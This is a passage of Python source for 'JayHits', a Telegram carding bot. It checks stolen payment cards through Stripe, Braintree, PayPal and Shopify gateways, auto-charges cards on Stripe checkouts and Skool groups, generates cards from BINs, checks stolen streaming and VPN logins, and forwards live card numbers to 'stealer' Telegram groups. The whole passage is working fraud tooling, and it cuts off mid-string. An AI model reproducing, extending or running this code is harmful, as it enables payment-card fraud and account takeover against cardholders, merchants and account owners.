        print(f"Bot group log error: {e}")

def _mask_card(card: str) -> str:
    parts = [p.strip() for p in str(card).split("|")]
    num = parts[0] if parts else card
    if len(num) > 10:
        masked = num[:6] + "X" * (len(num) - 10) + num[-4:]
    elif len(num) > 4:
        masked = num[:4] + "X" * (len(num) - 4)
    else:
        masked = "XXXX"
    exp_m = "**" if len(parts) > 1 else ""
    exp_y = "**" if len(parts) > 2 else ""
    cvv   = "***" if len(parts) > 3 else ""
    pieces = [masked]
    if exp_m: pieces.append(exp_m)
    if exp_y: pieces.append(exp_y)
    if cvv:   pieces.append(cvv)
    return " | ".join(pieces)

def send_logs_group(user_name, user_id, card, gateway, response_msg, status, site=None, amount=None):
    """Send ALL check/hitter results to the dedicated logs group (never deleted, no membership requirement)."""
    try:
        bot_token = get_setting("TELEGRAM_BOT_TOKEN")
        logs_group_id = get_setting("LOGS_GROUP_ID").strip()
        if not bot_token or not logs_group_id or logs_group_id == "0":
            return
        import html as _html
        display_name = user_name or str(user_id)
        tier = get_user_tier(user_id) if user_id else "free"
        tier_labels = {"free": "Free", "silver": "Silver", "gold": "Gold"}
        tier_tag = tier_labels.get(tier, "Free")
        display_name = f"{display_name} [{tier_tag}]"
        gate_display = GATEWAY_DISPLAY_NAMES.get(gateway, gateway) if gateway else gateway
        lines = [
            "\U0001f525 HIT DETECTED \u26a1",
            f"\U0001f464 {_html.escape(str(display_name))}",
            f"\u2194\ufe0f Gateway: {_html.escape(str(gate_display or ''))}",
            f"\u2705 Response: {_html.escape(str(response_msg or ''))}",
        ]
        if site:
            lines.append(f"\U0001f310 Site: {_html.escape(str(site))}")
        if amount:
            lines.append(f"\U0001f4b0 Amount: {_html.escape(str(amount))}")
        try:
            _bu = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5).json()
            _bot_uname = _bu.get("result", {}).get("username", "")
        except Exception:
            _bot_uname = ""
        text = "\n".join(lines)
        if _bot_uname:
            text += f'\n<a href="https://t.me/{_bot_uname}/web">Open JayHits</a>'
        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
            "chat_id": int(logs_group_id),
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }, timeout=10)
    except Exception as e:
        print(f"Logs group send error: {e}")

async def save_approved_card(card, status, response, gateway, price, user_id=None, user_name=None):
    try:
        async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
            await f.write(f"{card} | {status} | {response} | {gateway} | {price}\n")
    except Exception as e: print(f"Error saving card to {CC_FILE}: {str(e)}")
    if status == "CHARGED":
        await store_charged_cc(card, gateway, user_id, user_name)
    try:
        asyncio.create_task(notify_dashboard_hit(card, status, response, gateway, user_id, user_name))
    except Exception:
        pass
    try:
        asyncio.create_task(asyncio.to_thread(send_logs_group, user_name, user_id, card, gateway, response, status))
    except Exception:
        pass
    try:
        if HIT_FORWARD_GROUP:
            resp_lower = response.lower() if response else ""
            is_hit_charged = "charged" in resp_lower or status == "CHARGED"
            is_hit_insuff = "insufficient" in resp_lower or "insuff" in resp_lower
            is_hit_live = "ccn live" in resp_lower or ("approved" in resp_lower and status not in ("DECLINED", "ERROR"))
            # Stealer group: ALL live hits — charged, insufficient, CCN Live, Approved, 3DS CCN Live, etc.
            if is_hit_charged or is_hit_insuff or is_hit_live:
                icon = "\U0001f525" if status == "CHARGED" else "\u2705"
                tier = get_user_tier(user_id) if user_id else "free"
                tier_labels = {"free": "Free", "silver": "Silver", "gold": "Gold"}
                tier_tag = tier_labels.get(tier, "Free")
                hit_msg = (
                    f"{icon} **{status}**\n"
                    f"**Card:** `{card}`\n"
                    f"**Response:** {response}\n"
                    f"**Gateway:** {gateway}"
                )
                if user_name and user_id:
                    hit_msg += f"\n**Checked By:** [{user_name} [{tier_tag}]](tg://user?id={user_id})"
                await client.send_message(HIT_FORWARD_GROUP, hit_msg)
            if is_hit_charged and STEALER_GROUP_2:
                try:
                    await client.send_message(STEALER_GROUP_2, hit_msg)
                except Exception:
                    pass
    except Exception as e:
        print(f"Hit forward error: {e}")

async def pin_charged_message(event, message):
    try:
        if event.is_group: await message.pin()
    except Exception as e: print(f"Failed to pin message: {e}")

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try: parsed = urlparse(url)
        except: return False
        domain = parsed.netloc
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(domain_pattern, domain))

def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line and is_valid_url_or_domain(cleaned_line): clean_urls.add(cleaned_line)
    return list(clean_urls)

async def test_single_site(site, test_card="4111111111111111|12|2028|123"):
    try:
        from gates.shopify_native import _shopify_check
        clean_site = site.replace("https://", "").replace("http://", "").rstrip("/")
        parts = test_card.split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        session = await get_http_session()
        result = await _shopify_check(session, clean_site, cc, mm, yy, cvv)
        amount = result[0]
        response = result[1]
        if amount is None and response in ("No session token", "Site requires login", "No products available", "Captcha required"):
            return {"status": "dead", "response": response, "site": site, "price": "-"}
        if amount is None:
            if response and any(x in response.lower() for x in ["cloudflare", "captcha", "access denied", "connection", "timeout", "ssl", "could not resolve"]):
                return {"status": "dead", "response": response, "site": site, "price": "-"}
            return {"status": "working", "response": response or "Reachable", "site": site, "price": str(amount) if amount else "-"}
        return {"status": "working", "response": response, "site": site, "price": str(amount)}
    except Exception as e:
        return {"status": "dead", "response": str(e), "site": site, "price": "-"}

def extract_urls_from_content(content):
    if not content:
        return []
    url_patterns = [
        r'https?://[^\s<>"\'{}|\\^`\[\]]+',
        r'www\.[^\s<>"\'{}|\\^`\[\]]+\.[a-z]{2,}',
        r'[a-z0-9]+(?:\.[a-z0-9]+)+\.[a-z]{2,}(?:/[^\s]*)?',
    ]
    all_urls = []
    for pattern in url_patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        all_urls.extend(matches)
    cleaned_urls = []
    for url in all_urls:
        url = url.strip()
        url = url.rstrip('.,;!?)}\'"<>')
        url = url.rstrip('/')
        if len(url) < 8 or ' ' in url:
            continue
        if url.startswith('www.'):
            url = 'https://' + url
        elif not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        url = re.sub(r'^\[url\]', '', url, flags=re.IGNORECASE)
        url = re.sub(r'\[/url\]$', '', url, flags=re.IGNORECASE)
        url = re.sub(r'^url=', '', url, flags=re.IGNORECASE)
        if ('.' in url and
            '//' in url and
            len(url) > 10 and
            not url.endswith('.') and
            not url.endswith(',')):
            cleaned_urls.append(url)
    seen = set()
    unique_urls = []
    for url in cleaned_urls:
        norm_url = url.lower().replace('http://', 'https://')
        if norm_url not in seen:
            seen.add(norm_url)
            unique_urls.append(url)
    return unique_urls

SESSION_NAME = 'cc_bot'
TOKEN_HASH_FILE = os.path.join(os.path.dirname(__file__), ".bot_token_hash")

def _cleanup_stale_session():
    current_hash = hashlib.md5(BOT_TOKEN.encode()).hexdigest() if BOT_TOKEN else ""
    stored_hash = ""
    try:
        if os.path.exists(TOKEN_HASH_FILE):
            with open(TOKEN_HASH_FILE, "r") as f:
                stored_hash = f.read().strip()
    except Exception:
        pass

    if stored_hash and current_hash and stored_hash != current_hash:
        print("[SESSION] Bot token changed — cleaning old session files...")
        for ext in ["", "-journal"]:
            path = os.path.join(os.path.dirname(__file__), f"{SESSION_NAME}.session{ext}")
            if os.path.exists(path):
                try:
                    os.remove(path)
                    print(f"[SESSION] Deleted {path}")
                except Exception as e:
                    print(f"[SESSION] Failed to delete {path}: {e}")

    if current_hash:
        try:
            with open(TOKEN_HASH_FILE, "w") as f:
                f.write(current_hash)
        except Exception:
            pass

_cleanup_stale_session()

client = TelegramClient(
    SESSION_NAME,
    API_ID,
    API_HASH,
    connection_retries=10,
    auto_reconnect=True,
    timeout=120,
    request_retries=10,
    flood_sleep_threshold=120,
    proxy=None,
    use_ipv6=False
)

PUBLIC_COMMANDS = {"/start"}

@client.on(events.NewMessage())
async def _public_command_gate(event):
    text = (getattr(event.message, "message", "") or "").strip()
    if not text or not _is_command(text):
        return
    command = text.split()[0].split("@")[0].lower()
    if command in PUBLIC_COMMANDS or event.sender_id in ADMIN_ID:
        return
    await event.reply("JayHits only supports /start in Telegram chat. Please use the web dashboard for everything else.")
    raise events.StopPropagation

# ── Global Anti-Flood Gate (registered FIRST — runs before every handler) ────
@client.on(events.NewMessage())
async def _global_flood_gate(event):
    uid = event.sender_id
    if not uid or uid in ADMIN_ID:
        return  # never block admins

    # ── 1. Message-rate flood check ──────────────────────────────────────────
    status = await check_flood(uid)

    if status == 'muted':
        raise events.StopPropagation   # drop silently

    if status == 'warned':
        try:
            warn_msg = await event.reply(
                "⚠️ **Slow down!** You're sending too many messages.\n"
                f"You've been muted for {_FLOOD_MUTE_SEC} seconds."
            )
            asyncio.create_task(auto_delete_message(warn_msg, 15))
        except Exception:
            pass
        raise events.StopPropagation   # block this message too

    if status == 'banned':
        try:
            await event.reply(
                "🚫 **You have been automatically banned** for flooding.\n"
                f"Contact {ADMIN_USERNAME} to appeal."
            )
        except Exception:
            pass
        raise events.StopPropagation

    # ── 2. Per-command 15-second cooldown ────────────────────────────────────
    # Only applies to messages that are commands (/cmd or .cmd)
    if _is_command(event.raw_text or ""):
        allowed, remaining = _check_cmd_spam(uid)
        if not allowed:
            now = time.time()
            last_alert = _cmd_alerted.get(uid, 0)
            # Send at most one alert per cooldown window
            if now - last_alert > _CMD_COOLDOWN_SEC:
                _cmd_alerted[uid] = now
                try:
                    alert = await event.reply(
                        f"🛡 **Anti-Spam:** Please wait **{remaining}s** before sending another command.\n"
                        f"_Each command has a {_CMD_COOLDOWN_SEC}-second cooldown._"
                    )
                    asyncio.create_task(auto_delete_message(alert, 10))
                except Exception:
                    pass
            raise events.StopPropagation

# ── Callback query flood gate ─────────────────────────────────────────────────
@client.on(events.CallbackQuery())
async def _global_callback_flood_gate(event):
    uid = event.sender_id
    if not uid or uid in ADMIN_ID:
        return

    status = await check_flood(uid)
    if status in ('muted', 'warned', 'banned'):
        try:
            await event.answer("⚠️ Slow down! You're clicking too fast.", alert=False)
        except Exception:
            pass
        raise events.StopPropagation

@client.on(events.CallbackQuery(pattern=rb"^fs2:"))
async def _forward_stealer2_callback(event):
    if event.sender_id not in ADMIN_ID:
        await event.answer("Not authorized", alert=True)
        return
    try:
        hit_id = event.data.decode("utf-8").split(":", 1)[1]
        pending_path = os.path.join(os.path.dirname(__file__), "pending_stealer.json")
        if not os.path.exists(pending_path):
            await event.answer("No pending data found", alert=True)
            return
        with open(pending_path, "r") as pf:
            pending = json.load(pf)
        entry = pending.get(hit_id)
        if not entry:
            await event.answer("Hit expired or already sent", alert=True)
            return
        stealer_msg = entry["msg"]
        await client.send_message(
            STEALER_GROUP_2,
            stealer_msg,
            parse_mode="md",
            link_preview=False,
        )
        del pending[hit_id]
        with open(pending_path, "w") as pf:
            json.dump(pending, pf)
        await event.answer("Sent to stealer group!", alert=False)
        try:
            await event.edit(buttons=None)
        except Exception:
            pass
    except Exception as e:
        await event.answer(f"Error: {str(e)[:50]}", alert=True)
    raise events.StopPropagation

def banned_user_message():
    return f"**You Are Banned!**\n\nYou are no longer allowed to use this bot.\n\nFor appeal, contact {ADMIN_USERNAME}"

def access_denied_message_with_button():
    message = (
        f"**You Need to Join Our Channel and Group To Use This Bot For Free**\n\n"
        f"Join our Channel and Group below to get started!"
    )
    buttons = []
    if CHANNEL_LINK:
        buttons.append([Button.url("Join Channel", CHANNEL_LINK)])
    if GROUP_LINK:
        buttons.append([Button.url("Join Group", GROUP_LINK)])
    return message, buttons

async def check_tool_access(tool_id, user_id):
    if user_id in ADMIN_ID:
        return True, None
    if not is_tool_on(tool_id):
        return False, f"Tool `/{tool_id}` is currently disabled by admin."
    if is_tool_premium(tool_id):
        if not await is_premium_user(user_id):
            return False, f"Tool `/{tool_id}` requires **Premium** access."
    return True, None

def clean_response(response):
    cleaned = re.sub(r'\s*\|\s*[A-Z]+\s+[A-Z]+\s*\|\s*[A-Z]{2,3}\s*\|\s*[^|]+\|\s*\d{4}\s*\[\d+\.?\d*s\]\s*$', '', response)
    cleaned = re.sub(r'\s*\[\d+\.?\d*s\]\s*$', '', cleaned)
    return cleaned.strip()

def format_gateway_result(status_header, cc, mm, yy, cvv, gateway_name, response, brand, bin_type, level, bank, country, flag, elapsed, first_name, user_id, rank, proxy_status="Not Set"):
    response = clean_response(response)
    bin_digits = cc[:6] if len(cc) >= 6 else cc
    last_four = cc[-4:] if len(cc) >= 4 else cc
    country_code = country[:3].upper() if country else "N/A"
    bot_tag = BOT_USERNAME or ADMIN_USERNAME

    amount_match = re.search(r'\$[\d.]+', response)
    charge_amount = amount_match.group(0) if amount_match else None

    if charge_amount:
        gw_display = f"{gateway_name} {charge_amount}"
    else:
        gw_display = gateway_name

    if status_header == "CHARGED":
        header = "#Charged \U0001f525\U0001f525"
        status_txt = "Charged \U0001f525"
        resp_icon = ""
    elif status_header == "APPROVED":
        if gateway_name and gateway_name.lower() == "vbv":
            header = "#Approved Non Vbv \u2705\U0001f389"
            status_txt = "Approved  Non Vbv \u2705\U0001f389"
        else:
            header = "#Approved \u2705"
            status_txt = "Approved \U0001f389"
        resp_icon = "\U0001f4c9\U0001f4c9"
        response = re.sub(r'^(?:Approved\s*-\s*)', '', response, flags=re.IGNORECASE).strip()
    elif status_header == "DECLINED":
        header = "#Declined \u26d4"
        status_txt = "Declined \u274c"
        resp_icon = ""
    else:
        header = "#Unknown \u2753"
        status_txt = "Unknown \u2753"
        resp_icon = ""

    if status_header not in ("CHARGED",):
        response = mask_response(response)

    sep = "\u2550" * 19

    cc_str = f"{cc}|{mm}|{yy}|{cvv}"
    if status_header == "APPROVED":
        cc_display = f"{cc_str}\U0001f7e2"
    else:
        cc_display = cc_str

    resp_line = f"{response} | {brand} {bin_type} | {country_code} | {last_four}"

    return f"""\u276f {header}
{sep}
\u2b29 **Gateway** \u00bb {gw_display}
\u2b29 **CC** \u00bb {cc_display}
\u2b29 **Status** \u00bb {status_txt}
\u2b29 **Response** \u00bb {resp_line}{resp_icon}
{sep}
\u2b29 **BIN** \u00bb {bin_digits}
\u2b29 **Bank** \u00bb {brand} {bin_type} | {country_code} | {bank} | {last_four}
\u2b29 **Country** \u00bb {country} {flag}
{sep}
\u23f1 **Time** \u00bb {elapsed}s
\U0001f464 **Req By** \u00bb [{first_name}](tg://user?id={user_id}) [{rank}]
\U0001f310 **Proxy** \u00bb {proxy_status}
\U0001f916 **Bot** \u00bb {bot_tag}"""

ALL_GATEWAY_ALIASES = list(get_flat_registry().keys())

# --- Group Welcome Handler ---

_welcome_sent = {}

@client.on(events.ChatAction)
async def welcome_handler(event):
    if not event.user_joined and not event.user_added:
        return
    if event.is_private:
        return
    chat_id = event.chat_id
    if GROUP_ID:
        abs_id = abs(GROUP_ID)
        allowed = {abs_id, -abs_id, int(f"-100{abs_id}")}
        if chat_id not in allowed:
            return
    else:
        return
    try:
        user = await event.get_user()
        if not user or user.bot:
            return
        now = time.time()
        dedup_key = f"{user.id}_{chat_id}"
        if dedup_key in _welcome_sent and (now - _welcome_sent[dedup_key]) < 30:
            return
        _welcome_sent[dedup_key] = now
        for k in [k for k, v in _welcome_sent.items() if now - v > 120]:
            del _welcome_sent[k]
        first_name = user.first_name or "User"
        username = f"@{user.username}" if user.username else first_name
        bot_tag = BOT_USERNAME or ADMIN_USERNAME
        sep = "\u2500" * 24
        text = (
            f"\U0001f44b **Hey {username}!**\n"
            f"{sep}\n\n"
            f"Welcome to our group!\n"
            f"You can now use the bot here for free.\n\n"
            f"Enjoy super fast checking!\n\n"
            f"\U0001f916 **Bot:** {bot_tag}"
        )
        buttons = [
            [Button.url("\U0001f4ac Start Bot", f"https://t.me/{bot_tag.replace('@','')}")],
        ]
        await event.reply(text, buttons=buttons)
    except Exception as e:
        print(f"Welcome handler error: {e}")

# --- Bot Command Handlers ---

@client.on(events.NewMessage(pattern=r'(?i)^[/]start$'))
async def start(event):
    await register_user(event.sender_id)
    # Cache profile picture in the background — don't delay the /start reply
    asyncio.ensure_future(cache_avatar(event.sender_id))
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())

    user = await event.get_sender()
    first_name = user.first_name or "User"

    if access_type in ["premium_private", "premium_group"]:
        status_icon = "\u2b50"
        status_text = "Premium"
        limit = get_cc_limit(access_type, event.sender_id)
    elif event.sender_id in ADMIN_ID:
        status_icon = "\U0001f451"
        status_text = "Admin"
        limit = "Unlimited"
    else:
        status_icon = "\U0001f539"
        status_text = "Free"
        limit = get_cc_limit(access_type, event.sender_id)

    flat = get_flat_registry()
    total_gates = len(flat)
    active_gates = sum(1 for a in flat if is_gateway_on(a))

    sep = "\u2500" * 24

    text = (
        f"\u2b29 **JayHits** \u2b29\n"
        f"{sep}\n\n"
        f"\u2728 Welcome, **{first_name}**!\n\n"
        f"\U0001f194 Your User ID: `{event.sender_id}`\n\n"
        f"\u25cf Bot Status: **Active** \u2705\n"
        f"\u25cf Gateways: **{active_gates}/{total_gates}** Online\n"
        f"\u25cf Your Plan: {status_icon} **{status_text}**\n"
        f"\u25cf CC Limit: **{limit}** cards\n\n"
        f"{sep}\n"
        f"Use the web dashboard for your tools and settings."
    )

    buttons = [
        [Button.url("\U0001f4ac Join Group", GROUP_LINK), Button.url("\U0001f4e9 Contact", f"https://t.me/{ADMIN_USERNAME.replace('@','')}")],
    ]

    is_private = event.is_private if hasattr(event, 'is_private') else False
    if is_private and not (hasattr(event, 'query')):
        cc_limit = get_cc_limit(access_type, event.sender_id)
        private_tip = (
            f"\n\n\U0001f4ac **Private Chat Unlocked!**\n"
            f"Your dashboard access is ready.\n"
            f"Telegram chat command access is limited to `/start`."
        )
        text += private_tip

    if hasattr(event, 'edit') and callable(getattr(event, 'edit', None)) and hasattr(event, 'query'):
        try:
            await event.edit(text, buttons=buttons)
            return
        except Exception:
            pass
    await event.reply(text, buttons=buttons)


@client.on(events.CallbackQuery(data=b"menu_gates"))
async def menu_gates_cb(event):
    sep = "\u2500" * 24
    text = f"\u26a1 **GATEWAY LIST**\n{sep}\n\n"

    for cat_key, cat_data in GATEWAY_REGISTRY.items():
        cat_icon = "\U0001f512" if cat_data["label"].lower().startswith("auth") else "\U0001f4b3"
        text += f"{cat_icon} **{cat_data['label']}**\n"
        for alias, gate_info in cat_data["gates"].items():
            on = is_gateway_on(alias)
            dot = "\U0001f7e2" if on else "\U0001f534"
            text += f"  {dot} `/{alias}` \u2014 {gate_info['name']}\n"
        text += "\n"

    text += (
        f"{sep}\n"
        f"**Usage:** `/<gate> <cc|mm|yy|cvv>`\n"
        f"`/chk <cc>` \u2014 Combined Check (CW + RZ)\n"
        f"`/all <cc>` \u2014 Check on all gates\n"
        f"`/co <cards> <checkout_link>` \u2014 Stripe Checkout Auto-Hitter"
    )
    await event.edit(text, buttons=[
        [Button.inline("\U0001f512 Skool Gate", b"menu_skool"), Button.inline("\U0001f4cb Mass Check", b"menu_masscheck")],
        [Button.inline("\u25c0 Back to Menu", b"back_main")]
    ])


@client.on(events.CallbackQuery(data=b"menu_lookup"))
async def menu_lookup_cb(event):
    sep = "\u2500" * 24
    text = (
        f"\U0001f50d **LOOKUP & INFO**\n{sep}\n\n"
        f"\u25cf `/bin <bin>` \u2014 BIN Lookup\n"
        f"  Get card brand, type, bank, country\n\n"
        f"\u25cf `/sk <sk_live_xxx>` \u2014 Stripe Key Check\n"
        f"  Validate Stripe secret keys\n\n"
        f"\u25cf `/skc` \u2014 Mass SK Checker\n"
        f"  Check multiple SK keys at once\n\n"
        f"\u25cf `/id` or `/me` \u2014 Your Telegram Info\n"
        f"  Shows your ID and account details\n\n"
        f"\u25cf `/info` \u2014 Bot Account Info\n"
        f"  Plan status, limits, usage"
    )
    await event.edit(text, buttons=[[Button.inline("\u25c0 Back to Menu", b"back_main")]])


@client.on(events.CallbackQuery(data=b"menu_toolkit"))
async def menu_toolkit_cb(event):
    sep = "\u2500" * 24
    text = (
        f"\U0001f6e0 **TOOLKIT**\n{sep}\n\n"
        f"\u25cf `/gen <bin>` \u2014 CC Generator\n"
        f"  Generate cards from a BIN\n\n"
        f"\u25cf `/rand <country>` \u2014 Address Generator\n"
        f"  Random fake identity for testing\n\n"
        f"\u25cf `/url <site>` \u2014 Gateway Analyzer\n"
        f"  Detect gateways, captcha, SSL & more\n\n"
        f"\u25cf `/findsite <gateway>` \u2014 Site Finder\n"
        f"  Find sites using a payment gateway\n\n"
        f"\u25cf `/tr <lang> <text>` \u2014 Translator\n"
        f"  Translate text to any language\n\n"
        f"\u25cf `/langcode` \u2014 Language Codes\n"
        f"  List of supported language codes\n\n"
        f"\u25cf `/ping` \u2014 Ping Test\n"
        f"  Check bot response time\n\n"
        f"\u25cf `/fl` \u2014 CC Extractor\n"
        f"  Extract CCs from text or .txt files\n\n"
        f"\u25cf `/filter` \u2014 CC Filter\n"
        f"  Reply to .txt \u2014 filter by Country/BIN/Type"
    )
    await event.edit(text, buttons=[
        [Button.inline("\U0001f310 Proxy Guide", b"menu_proxyguide")],
        [Button.inline("\u25c0 Back to Menu", b"back_main")]
    ])


@client.on(events.CallbackQuery(data=b"menu_accounts"))
async def menu_accounts_cb(event):
    sep = "\u2500" * 24
    text = (
        f"\U0001f464 **ACCOUNTS CHECKER**\n{sep}\n\n"
        f"\U0001f3ae **Supported Checkers:**\n\n"
        f"\u25cf `/acc cr <email:pass>` \u2014 Crunchyroll\n"
        f"  Plan / Expiry / Country\n\n"
        f"\u25cf `/acc xbox <email:pass>` \u2014 Xbox Game Pass\n"
        f"  Sub / Billing / Points\n\n"
        f"\u25cf `/acc cg <email:pass>` \u2014 CyberGhost VPN\n"
        f"  Plan / Days Left / Devices\n\n"
        f"\u25cf `/acc duo <email:pass>` \u2014 Duolingo\n"
        f"  Plus Status / XP / Streak\n\n"
        f"\u25cf `/acc hoi <email:pass>` \u2014 Hoichoi\n"
        f"  Plan / Expiry / Country\n\n"
        f"{sep}\n"
        f"**Statuses:** HIT = Premium | FREE = No sub | CUSTOM = Special | FAIL = Bad creds"
    )
    await event.edit(text, buttons=[[Button.inline("\u25c0 Back to Menu", b"back_main")]])


@client.on(events.CallbackQuery(data=b"menu_shopify"))
async def menu_shopify_cb(event):
    sep = "\u2500" * 24
    text = (
        f"\U0001f310 **SHOPIFY SELF CHECK**\n{sep}\n\n"
        f"\u25cf `/sh <alias> <cc>` \u2014 Specific gateway\n"
        f"  Use a particular site/gateway\n\n"
        f"\u25cf `/shp <cc>` \u2014 Shopify Native gate\n"
        f"  Direct captcha-free card check\n\n"
        f"\u25cf `/mtxt` \u2014 Mass check from file\n"
        f"  Reply to .txt with CCs\n\n"
        f"{sep}\n"
        f"**Site Management:**\n"
        f"`/addsite <url>` \u2014 Add site (validated)\n"
        f"`/viewsite` \u2014 View your sites\n"
        f"`/rmsite <url>` \u2014 Remove site(s)\n"
        f"`/removeall` \u2014 Clear all your sites"
    )
    await event.edit(text, buttons=[[Button.inline("\u25c0 Back to Menu", b"back_main")]])


@client.on(events.CallbackQuery(data=b"menu_skool"))
async def menu_skool_cb(event):
    from gates.skool_accounts import get_user_skool_accounts, get_account_count, get_all_user_skool_accounts
    is_admin = event.sender_id in ADMIN_ID
    user_count = len(get_user_skool_accounts(event.sender_id))
    global_count = get_account_count()
    sep = "\u2500" * 26

    if is_admin:
        all_user_count = len(get_all_user_skool_accounts())
        account_line = (
            f"🌐 **Global:** {global_count}  \u2022  "
            f"👥 **User Pool:** {all_user_count}\n\n"
        )
    else:
        account_line = (
            f"\U0001f464 **Your Accounts:** {user_count}  \u2022  "
            f"\U0001f310 **Global:** {global_count}\n\n"
        )

    text = (
        f"\U0001f512 **SKOOL GATE \u2014 STRIPE**\n"
        f"{sep}\n\n"
        f"\u26a1 **Available Gates**\n\n"
        f"\U0001f7e2 `/skl <cc>`  \u2014  Stripe Auth $0.1\n"
        f"\U0001f7e1 `/skl1 <cc>` \u2014  Stripe Charge $1\n"
        f"\U0001f534 `/skl2 <cc>` \u2014  Stripe Charge $7\n"
        f"\U0001f3b0 `/auto <cc>` \u2014  Stripe Random Charge\n\n"
        f"{sep}\n"
        f"{account_line}"
        f"\u2795 `/addskool email:pass`\n"
        f"\u2796 `/rmskool email`\n"
        f"\U0001f4cb `/viewskool` \u2014 View accounts\n"


        f"\U0001f4a1 Go to **skool.com**, create an account\n"
        f"and add it here to activate gates.\n\n"
        f"\U0001f4c8 **Performance Tip:**\n"
        f"Add multiple Skool accounts to increase your checking speed.\n"
        f"**1** Account = **1x** Check Speed\n"
        f"**10** Accounts = **10x** Check Speed"
    )
    await event.edit(text, buttons=[
        [Button.inline("\U0001f3b0 Auto Skool", b"menu_auto_skool")],
        [Button.inline("\u25c0 Back", b"back_main")]
    ])


@client.on(events.CallbackQuery(data=b"menu_auto_skool"))
async def menu_auto_skool_cb(event):
    sep = "\u2500" * 24
    text = (
        f"\U0001f3b0 **AUTO SKOOL \u2014 STRIPE RANDOM CHARGE**\n"
        f"{sep}\n\n"
        f"Automatically discovers paid Skool groups\n"
        f"and charges cards from **low to high** price.\n\n"
        f"\u26a1 **Command:**\n"
        f"`/auto <cc|mm|yy|cvv>`\n\n"
        f"\U0001f4e6 **Multi-CC:**\n"
        f"`/auto cc1|mm|yy|cvv`\n"
        f"`cc2|mm|yy|cvv`\n"
        f"`cc3|mm|yy|cvv`\n\n"
        f"\U0001f4c4 **File Check:**\n"
        f"Reply to a `.txt` file with `/auto`\n\n"
        f"{sep}\n"
        f"\U0001f504 Groups are auto-discovered \u2014 no setup needed.\n"
        f"Charges cycle through groups sorted by price."
    )
    await event.edit(text, buttons=[
        [Button.inline("\U0001f512 Back to Skool", b"menu_skool")],
        [Button.inline("\u25c0 Back to Menu", b"back_main")]
    ])


@client.on(events.CallbackQuery(data=b"menu_auto_hitter"))
async def menu_auto_hitter_cb(event):
    sep = "\u2500" * 24
    try:
        site_visible = get_bool_setting("HITTER_SITE_VISIBLE", True)
    except Exception:
        site_visible = True
    site_toggle_label = "\U0001f310 Visible Site: \u2705 YES" if site_visible else "\U0001f310 Visible Site: \u274c NO"
    text = (
        f"\U0001f3af **AUTO HITTER**\n"
        f"{sep}\n\n"
        f"\U0001f4b0 **Stripe Checkout Auto-Hitter**\n"
        f"`/co <cards> <checkout_url>`\n\n"
        f"**Usage:**\n"
        f"`/co cc1|mm|yy|cvv`\n"
        f"`cc2|mm|yy|cvv`\n"
        f"`https://checkout.stripe.com/...`\n\n"
        f"{sep}\n\n"
        f"\U0001f3b0 **Stripe Random Charge**\n"
        f"`/auto <cc|mm|yy|cvv>`\n\n"
        f"Auto-discovers paid groups and charges\n"
        f"cards from low to high price.\n\n"
        f"{sep}\n"
        f"Both tools support multi-CC and file input.\n\n"
        f"{sep}\n"
        f"\U0001f4cd **Site Visible in Group Log**\n"
        f"When OFF, hit logs sent to the group\n"
        f"will show **Hidden From User** instead\n"
        f"of the actual site. Admin DM always\n"
        f"shows the full site."
    )
    await event.edit(text, buttons=[
        [Button.inline(site_toggle_label, b"toggle_hitter_site")],
        [Button.inline("\U0001f3b0 Auto Skool", b"menu_auto_skool")],
        [Button.inline("\u25c0 Back to Menu", b"back_main")]
    ])


@client.on(events.CallbackQuery(data=b"toggle_hitter_site"))
async def toggle_hitter_site_cb(event):
    sender_id = event.sender_id
    if sender_id not in ADMIN_ID:
        await event.answer("Admin only.", alert=True)
        return
    try:
        current = get_bool_setting("HITTER_SITE_VISIBLE", True)
        write_runtime_setting("HITTER_SITE_VISIBLE", not current)
        new_val = not current
        label = "✅ YES (Visible)" if new_val else "❌ NO (Hidden)"
        await event.answer(f"Site visibility in group log set to: {label}", alert=True)
    except Exception as e:
        await event.answer(f"Error: {e}", alert=True)
        return
    await menu_auto_hitter_cb(event)


@client.on(events.CallbackQuery(data=b"menu_masscheck"))
async def menu_masscheck_cb(event):
    sep = "\u2500" * 24
    text = (
        f"\U0001f4cb **MASS CHECK GUIDE**\n{sep}\n\n"
        f"Send a gate command with multiple\n"
        f"cards (one per line, max **10**):\n\n"
        f"{sep}\n"
        f"\u26a1 **Stripe $0.1** [Limit 10]\n"
        f"`/skl 4111111111111111|12|25|123`\n"
        f"`4222222222222222|06|26|456`\n\n"
        f"\u26a1 **Stripe $1** [Limit 10]\n"
        f"`/skl1 4111111111111111|12|25|123`\n"
        f"`4222222222222222|06|26|456`\n\n"
        f"\u26a1 **Stripe $7** [Limit 10]\n"
        f"`/skl2 4111111111111111|12|25|123`\n"
        f"`4222222222222222|06|26|456`\n\n"
        f"\U0001f4b3 **Braintree Auth** [Limit 10] \u2b50\n"
        f"`/b3 4111111111111111|12|25|123`\n"
        f"`4222222222222222|06|26|456`\n\n"
        f"\U0001f4b3 **Braintree Charge** [Limit 10] \u2b50\n"
        f"`/b3c 4111111111111111|12|25|123`\n"
        f"`4222222222222222|06|26|456`\n\n"
        f"\U0001f4b3 **PayPal Charge $0.01** [Limit 10]\n"
        f"`/pp 4111111111111111|12|25|123`\n"
        f"`4222222222222222|06|26|456`\n\n"
        f"\U0001f4b3 **PayPal Charge $1** [Limit 10]\n"
        f"`/ppn 4111111111111111|12|25|123`\n"
        f"`4222222222222222|06|26|456`\n\n"
        f"{sep}\n"
        f"\u2b50 = **Premium Required**\n\n"
        f"**File Check:** Reply to a `.txt`\n"
        f"file with any gate command\n\n"
